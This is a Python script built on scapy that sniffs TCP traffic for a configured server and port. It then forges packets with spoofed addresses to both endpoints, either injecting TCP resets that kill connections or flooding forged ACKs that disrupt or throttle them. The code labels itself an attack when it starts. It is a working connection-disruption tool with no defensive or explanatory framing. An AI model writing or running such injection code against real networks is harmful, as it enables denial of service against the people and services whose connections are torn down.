import time
from scapy.all import sniff, send, IP, TCP, conf
import json
from pathlib import Path
import random


ARGS = json.loads(Path("config.json").read_text())
SOCKET = conf.L2socket(iface=ARGS["iface"])


def cap_filter(packet) -> bool:
    ports = [ARGS["port"]] + ARGS["passive_ports"]
    return (
        IP in packet
        and TCP in packet
        and (packet[TCP].sport in ports or packet[TCP].dport in ports)
    )


def send_acks(packet) -> None:
    size = len(packet[TCP].payload)
    seq = packet[TCP].seq
    ack = packet[TCP].ack
    ack = seq + size
    seq = ack

    # send to source
    to_src = IP(src=packet[IP].dst, dst=packet[IP].src) / TCP(
        flags="A",
        sport=packet[TCP].dport,
        dport=packet[TCP].sport,
        seq=seq,
        ack=ack    # packet[TCP].ack,
    ) / "dummy payload"
    for _ in range(3):
        SOCKET.send(
            to_src,
        )

    # send to destination
    to_dst = IP(src=packet[IP].src, dst=packet[IP].dst) / TCP(
        flags="A",
        sport=packet[TCP].sport,
        dport=packet[TCP].dport,
        seq=seq,
        ack=ack,
    ) / "dummy payload"
    for _ in range(3):
        SOCKET.send(
            to_dst,
        )


def send_rsts(packet) -> None:
    size = len(packet[TCP].payload)
    seq = packet[TCP].seq
    ack = packet[TCP].ack
    ack = seq + size
    seq = ack

    # send to source
    to_src = IP(src=packet[IP].dst, dst=packet[IP].src) / TCP(
        flags="R",
        sport=packet[TCP].dport,
        dport=packet[TCP].sport,
        seq=seq,
        ack=ack
    ) / "dummy payload"
    SOCKET.send(to_src)

    # send to destination
    to_dst = IP(src=packet[IP].src, dst=packet[IP].dst) / TCP(
        flags="R",
        sport=packet[TCP].sport,
        dport=packet[TCP].dport,
        seq=seq,
        ack=ack
    ) / "dummy payload"
    SOCKET.send(
        to_dst,
    )


def ack():
    SOCKET.sniff(
        filter=f"tcp and host {ARGS['server_ip']}",
        lfilter=cap_filter,
        store=False,
        quiet=True,
        prn=send_acks,
    )


def rst():
    SOCKET.sniff(
        filter=f"tcp and host {ARGS['server_ip']}",
        lfilter=cap_filter,
        store=False,
        quiet=True,
        prn=send_rsts,
    )


def main():
    # parser = argparse.ArgumentParser(description="TCP throttling utility")
    # parser.add_argument("-s", "--source-host", type=str, required=True)
    # parser.add_argument("-d", "--destination-host", type=str, required=True)
    # parser.add_argument("-m", "--mode", choices=["ACK", "RST"], required=True)
    # parser.add_argument("-w", "--wait", type=int, default=0)
    print("starting attack")
    if ARGS["mode"] == "ACK":
        print("mode = ACK")
        ack()
    if ARGS["mode"] == "RST":
        print("mode = RST")
        rst()
    # can't get here
    exit(1)


if __name__ == "__main__":
    main()
